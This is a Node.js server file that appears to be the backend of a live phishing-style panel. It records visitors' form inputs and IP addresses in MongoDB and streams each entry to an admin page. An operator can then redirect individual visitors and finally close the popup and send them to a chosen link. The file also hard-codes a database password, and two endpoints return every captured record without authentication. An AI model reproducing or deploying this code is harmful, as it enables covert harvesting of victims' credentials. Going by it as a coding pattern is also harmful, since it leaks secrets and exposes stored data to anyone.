const express = require('express');
const http = require('http');
const path = require('path');
const socketIo = require('socket.io');
const mongoose = require('mongoose')
const axios = require('axios')

const app = express();
const server = http.createServer(app);
const io = socketIo(server);

app.use(express.static(path.join(__dirname, 'public')));

mongoose.connect('mongodb+srv://ilyes:Ilyes123@cluster0.mtghl.mongodb.net/?retryWrites=true&w=majority', {
  dbName: 'popup'
})

const userSchema = new mongoose.Schema({
    ipAddress: { type: String },
    userId: { type: String },
    datetime: { type: String },
    span: { type: String },
    input1: { type: String },
    input2: { type: String },
    input3: { type: String },
    input4: { type: String },
    input5: { type: String },
    input6: { type: String },
    input7: { type: String },
    input8: { type: String },
    active: { type: Boolean },
});
  
// Create a model based on the schema
const User = mongoose.model('User', userSchema);

// Handle root route
app.get('/', (req, res) => {
  // Send the index.html file
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Handle admin route
app.get('/admin', (req, res) => {
  // Send the admin.html file
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

app.get('/users', (req, res) => {
    User.find({ 'active': true }).then((result) => {
        res.json(result)
    })
})

app.get('/allUsers', (req, res) => {
    User.find({}).then((result) => {
        res.json(result)
    })
})


io.on('connection', (socket) => {
    console.log('A user connected');

    socket.on('formSubmit', (data) => {
        socket.broadcast.emit('updateTable', data)
        const user = new User({
            ipAddress: data.ipAddress,
            userId: data.userId,
            datetime: data.datetime,
            span: data.span,
            input1: data.input1,
            input2: data.input2,
            input3: data.input3,
            input4: data.input4,
            input5: data.input5,
            input6: data.input6,
            input7: data.input7,
            input8: data.input8,
            active: true
        })
        user.save()
    });

    socket.on('redirect', (data, url) => {
        // axios.get(url).then((response) => {
        //     socket.broadcast.emit('redirect', data, response.data)
        // })
        socket.broadcast.emit('redirect', data, url)
    });

    socket.on('finish', (data, link) => {
        io.emit('closePopup', data, link)
        io.emit('mainRedirect', data, link)
        User.findOneAndUpdate({ 'userId': data }, { 'active': false }).then(() => console.log('deleted'))
    });

    socket.on('popupClose', (data) => {
        io.emit('closePopup', data, '')
        User.findOneAndUpdate({ 'userId': data }, { 'active': false }).then(() => console.log('deleted'))
    });

    socket.on('disconnect', () => {
        console.log('User disconnected');
    });
});

server.listen(process.env.PORT || 5000)